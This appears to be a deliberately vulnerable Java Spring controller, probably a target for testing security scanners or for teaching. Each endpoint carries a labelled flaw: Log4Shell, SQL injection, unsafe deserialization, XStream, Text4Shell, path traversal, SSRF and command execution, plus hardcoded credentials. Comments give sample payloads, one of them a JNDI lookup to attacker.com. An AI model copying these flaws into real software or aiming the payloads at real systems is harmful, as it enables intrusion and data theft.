package com.demo.api;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.thoughtworks.xstream.XStream;
import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.net.URL;
import java.sql.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Base64;

@RestController
public class VulnController {

    private static final Logger logger = LogManager.getLogger(VulnController.class);

    // Hardcoded credentials
    private static final String DB_URL = "jdbc:postgresql://localhost:5432/appdb";
    private static final String DB_USER = "admin";
    private static final String DB_PASS = "password123";
    private static final String API_KEY = "sk-prod-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";

    @GetMapping("/login")
    public String login(@RequestParam String username) {
        // Log4Shell: CVE-2021-44228 — logging user-controlled input triggers JNDI lookup
        // PoC: username=${jndi:ldap://attacker.com/a}
        logger.info("Login attempt from user: {}", username);
        return "Processing login for: " + username;
    }

    @GetMapping("/user")
    public String getUser(@RequestParam String id) throws SQLException {
        // SQL Injection — string concatenation into JDBC query
        Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        Statement stmt = conn.createStatement();
        // VULNERABLE: id = "1 OR 1=1 --" returns all rows
        ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + id);
        StringBuilder result = new StringBuilder();
        while (rs.next()) {
            result.append(rs.getString("username")).append(":").append(rs.getString("password")).append("\n");
        }
        return result.toString();
    }

    @PostMapping("/deserialize")
    public String deserialize(@RequestBody String base64Data) {
        // Java deserialization RCE — commons-collections gadget chain
        try {
            byte[] data = Base64.getDecoder().decode(base64Data);
            // VULNERABLE: deserializing untrusted data with commons-collections on classpath
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object obj = ois.readObject();
            return obj.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    @PostMapping("/xml")
    public String parseXml(@RequestBody String xmlData) {
        // XXE via XStream (CVE-2021-39149) — arbitrary file read / SSRF
        XStream xstream = new XStream();
        // VULNERABLE: no security framework applied, allows arbitrary class instantiation
        Object obj = xstream.fromXML(xmlData);
        return obj.toString();
    }

    @GetMapping("/template")
    public String template(@RequestParam String expr) {
        // Text4Shell: CVE-2022-42889 — arbitrary code via commons-text StringSubstitutor
        // PoC: expr=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
        StringSubstitutor sub = StringSubstitutor.createInterpolator();
        // VULNERABLE: evaluates script/url/dns lookups in user-controlled string
        return sub.replace(expr);
    }

    @GetMapping("/file")
    public String readFile(@RequestParam String path) throws IOException {
        // Path traversal — arbitrary file read
        // PoC: path=../../etc/passwd
        return new String(new FileInputStream(path).readAllBytes());
    }

    @GetMapping("/fetch")
    public String fetch(@RequestParam String url) throws IOException {
        // SSRF — server-side request forgery
        // PoC: url=http://169.254.169.254/latest/meta-data/
        return new URL(url).openConnection().getInputStream()
            .readAllBytes().toString();
    }

    @GetMapping("/exec")
    public String exec(@RequestParam String cmd) throws IOException {
        // OS command injection
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        return new String(p.getInputStream().readAllBytes());
    }

    @GetMapping("/health")
    public Map<String, String> health() {
        // Information disclosure — exposes internal config
        Map<String, String> info = new HashMap<>();
        info.put("status", "UP");
        info.put("db_url", DB_URL);
        info.put("db_user", DB_USER);
        info.put("version", "1.0.0");
        info.put("java_version", System.getProperty("java.version"));
        return info;
    }
}
